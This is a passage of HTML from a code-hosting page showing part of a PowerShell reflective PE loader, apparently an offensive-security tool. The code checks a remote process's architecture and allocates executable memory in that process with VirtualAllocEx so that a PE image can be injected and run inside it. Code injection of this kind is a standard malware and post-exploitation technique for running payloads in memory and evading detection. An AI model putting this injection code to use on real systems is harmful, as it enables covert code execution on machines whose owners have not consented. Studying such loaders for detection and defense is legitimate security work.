          <td id="L2393" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2393"></td>
          <td id="LC2393" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L2394" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2394"></td>
          <td id="LC2394" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2395" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2395"></td>
          <td id="LC2395" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Kernel32Handle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetModuleHandle.Invoke</span></span>(<span class="pl-s"><span class="pl-pds">&quot;</span>kernel32.dll<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2396" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2396"></td>
          <td id="LC2396" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$Kernel32Handle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>IsWow64Process<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2397" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2397"></td>
          <td id="LC2397" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2398" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2398"></td>
          <td id="LC2398" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2399" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2399"></td>
          <td id="LC2399" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Couldn&#39;t locate IsWow64Process function to determine if target process is 32bit or 64bit<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2400" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2400"></td>
          <td id="LC2400" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2401" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2401"></td>
          <td id="LC2401" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2402" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2402"></td>
          <td id="LC2402" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">Bool</span>]<span class="pl-smi">$Wow64Process</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L2403" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2403"></td>
          <td id="LC2403" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.IsWow64Process.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$Wow64Process</span>)</td>
        </tr>
        <tr>
          <td id="L2404" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2404"></td>
          <td id="LC2404" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2405" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2405"></td>
          <td id="LC2405" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2406" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2406"></td>
          <td id="LC2406" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to IsWow64Process failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2407" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2407"></td>
          <td id="LC2407" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2408" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2408"></td>
          <td id="LC2408" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2409" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2409"></td>
          <td id="LC2409" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> ((<span class="pl-smi">$Wow64Process</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>) <span class="pl-k">-or</span> ((<span class="pl-smi">$Wow64Process</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>) <span class="pl-k">-and</span> ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>]) <span class="pl-k">-eq</span> <span class="pl-c1">4</span>)))</td>
        </tr>
        <tr>
          <td id="L2410" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2410"></td>
          <td id="LC2410" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2411" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2411"></td>
          <td id="LC2411" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Process64Bit</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L2412" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2412"></td>
          <td id="LC2412" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2413" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2413"></td>
          <td id="LC2413" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2414" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2414"></td>
          <td id="LC2414" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly</span></td>
        </tr>
        <tr>
          <td id="L2415" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2415"></td>
          <td id="LC2415" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$PowerShell64Bit</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span></td>
        </tr>
        <tr>
          <td id="L2416" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2416"></td>
          <td id="LC2416" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>]) <span class="pl-k">-ne</span> <span class="pl-c1">8</span>)</td>
        </tr>
        <tr>
          <td id="L2417" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2417"></td>
          <td id="LC2417" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2418" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2418"></td>
          <td id="LC2418" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$PowerShell64Bit</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L2419" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2419"></td>
          <td id="LC2419" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2420" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2420"></td>
          <td id="LC2420" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$PowerShell64Bit</span> <span class="pl-k">-ne</span> <span class="pl-smi">$Process64Bit</span>)</td>
        </tr>
        <tr>
          <td id="L2421" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2421"></td>
          <td id="LC2421" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2422" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2422"></td>
          <td id="LC2422" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PowerShell must be same architecture (x86/x64) as PE being loaded and remote process<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2423" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2423"></td>
          <td id="LC2423" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2424" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2424"></td>
          <td id="LC2424" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2425" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2425"></td>
          <td id="LC2425" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2426" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2426"></td>
          <td id="LC2426" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2427" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2427"></td>
          <td id="LC2427" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>]) <span class="pl-k">-ne</span> <span class="pl-c1">8</span>)</td>
        </tr>
        <tr>
          <td id="L2428" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2428"></td>
          <td id="LC2428" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2429" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2429"></td>
          <td id="LC2429" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Process64Bit</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L2430" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2430"></td>
          <td id="LC2430" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2431" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2431"></td>
          <td id="LC2431" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2432" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2432"></td>
          <td id="LC2432" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Process64Bit</span> <span class="pl-k">-ne</span> <span class="pl-smi">$PEInfo<span class="pl-smi">.PE64Bit</span></span>)</td>
        </tr>
        <tr>
          <td id="L2433" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2433"></td>
          <td id="LC2433" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2434" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2434"></td>
          <td id="LC2434" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PE platform doesn&#39;t match the architecture of the process it is being loaded in (32/64bit)<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2435" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2435"></td>
          <td id="LC2435" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2436" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2436"></td>
          <td id="LC2436" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2437" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2437"></td>
          <td id="LC2437" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2438" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2438"></td>
          <td id="LC2438" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address</span></td>
        </tr>
        <tr>
          <td id="L2439" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2439"></td>
          <td id="LC2439" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Allocating memory for the PE and write its headers to memory<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2440" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2440"></td>
          <td id="LC2440" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2441" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2441"></td>
          <td id="LC2441" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">#</span>ASLR check</span></td>
        </tr>
        <tr>
          <td id="L2442" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2442"></td>
          <td id="LC2442" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$LoadAddr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L2443" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2443"></td>
          <td id="LC2443" class="blob-code blob-code-inner js-file-line">        <span class="pl-smi">$PESupportsASLR</span> <span class="pl-k">=</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.DllCharacteristics</span></span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</span></span>) <span class="pl-k">-eq</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</span></span></td>
        </tr>
        <tr>
          <td id="L2444" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2444"></td>
          <td id="LC2444" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-k">-not</span> <span class="pl-smi">$ForceASLR</span>) <span class="pl-k">-and</span> (<span class="pl-k">-not</span> <span class="pl-smi">$PESupportsASLR</span>))</td>
        </tr>
        <tr>
          <td id="L2445" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2445"></td>
          <td id="LC2445" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2446" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2446"></td>
          <td id="LC2446" class="blob-code blob-code-inner js-file-line">			<span class="pl-c1">Write-Warning</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>WarningAction <span class="pl-k">Continue</span></td>
        </tr>
        <tr>
          <td id="L2447" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2447"></td>
          <td id="LC2447" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$LoadAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$OriginalImageBase</span></td>
        </tr>
        <tr>
          <td id="L2448" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2448"></td>
          <td id="LC2448" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2449" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2449"></td>
          <td id="LC2449" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">elseif</span> (<span class="pl-smi">$ForceASLR</span> <span class="pl-k">-and</span> (<span class="pl-k">-not</span> <span class="pl-smi">$PESupportsASLR</span>))</td>
        </tr>
        <tr>
          <td id="L2450" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2450"></td>
          <td id="LC2450" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="L2451" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2451"></td>
          <td id="LC2451" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">Write-Verbose</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PE file doesn&#39;t support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2452" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2452"></td>
          <td id="LC2452" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="L2453" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2453"></td>
          <td id="LC2453" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2454" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2454"></td>
          <td id="LC2454" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-smi">$ForceASLR</span> <span class="pl-k">-and</span> <span class="pl-smi">$RemoteLoading</span>)</td>
        </tr>
        <tr>
          <td id="L2455" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2455"></td>
          <td id="LC2455" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="L2456" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2456"></td>
          <td id="LC2456" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">Write-Error</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Cannot use ForceASLR when loading in to a remote process.<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>ErrorAction Stop</td>
        </tr>
        <tr>
          <td id="L2457" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2457"></td>
          <td id="LC2457" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="L2458" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2458"></td>
          <td id="LC2458" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">-and</span> (<span class="pl-k">-not</span> <span class="pl-smi">$PESupportsASLR</span>))</td>
        </tr>
        <tr>
          <td id="L2459" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2459"></td>
          <td id="LC2459" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="L2460" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2460"></td>
          <td id="LC2460" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">Write-Error</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PE doesn&#39;t support ASLR. Cannot load a non-ASLR PE in to a remote process<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>ErrorAction Stop</td>
        </tr>
        <tr>
          <td id="L2461" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2461"></td>
          <td id="LC2461" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="L2462" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2462"></td>
          <td id="LC2462" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2463" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2463"></td>
          <td id="LC2463" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEHandle</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero				<span class="pl-c"><span class="pl-c">#</span>This is where the PE is allocated in PowerShell</span></td>
        </tr>
        <tr>
          <td id="L2464" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2464"></td>
          <td id="LC2464" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$EffectivePEHandle</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero		<span class="pl-c"><span class="pl-c">#</span>This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.</span></td>
        </tr>
        <tr>
          <td id="L2465" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2465"></td>
          <td id="LC2465" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RemoteLoading</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L2466" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2466"></td>
          <td id="LC2466" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2467" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2467"></td>
          <td id="LC2467" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup</span></td>
        </tr>
        <tr>
          <td id="L2468" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2468"></td>
          <td id="LC2468" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$PEHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAlloc.Invoke</span></span>([<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.SizeOfImage</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L2469" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2469"></td>
          <td id="LC2469" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L2470" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2470"></td>
          <td id="LC2470" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>todo, error handling needs to delete this memory if an error happens along the way</span></td>
        </tr>
        <tr>
          <td id="L2471" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2471"></td>
          <td id="LC2471" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$EffectivePEHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAllocEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$LoadAddr</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.SizeOfImage</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L2472" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2472"></td>
          <td id="LC2472" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$EffectivePEHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2473" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2473"></td>
          <td id="LC2473" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2474" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2474"></td>
          <td id="LC2474" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to allocate memory in the remote process. If the PE being loaded doesn&#39;t support ASLR, it could be that the requested base address of the PE is already in use<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2475" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2475"></td>
          <td id="LC2475" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2476" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2476"></td>
          <td id="LC2476" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2477" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2477"></td>
          <td id="LC2477" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2478" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2478"></td>
          <td id="LC2478" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2479" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2479"></td>
          <td id="LC2479" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$NXCompatible</span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L2480" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2480"></td>
          <td id="LC2480" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2481" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2481"></td>
          <td id="LC2481" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$PEHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAlloc.Invoke</span></span>(<span class="pl-smi">$LoadAddr</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.SizeOfImage</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L2482" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2482"></td>
          <td id="LC2482" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2483" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2483"></td>
          <td id="LC2483" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L2484" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2484"></td>
          <td id="LC2484" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2485" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2485"></td>
          <td id="LC2485" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$PEHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAlloc.Invoke</span></span>(<span class="pl-smi">$LoadAddr</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.SizeOfImage</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L2486" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2486"></td>
          <td id="LC2486" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2487" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2487"></td>
          <td id="LC2487" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$EffectivePEHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$PEHandle</span></td>
        </tr>
        <tr>
          <td id="L2488" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2488"></td>
          <td id="LC2488" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
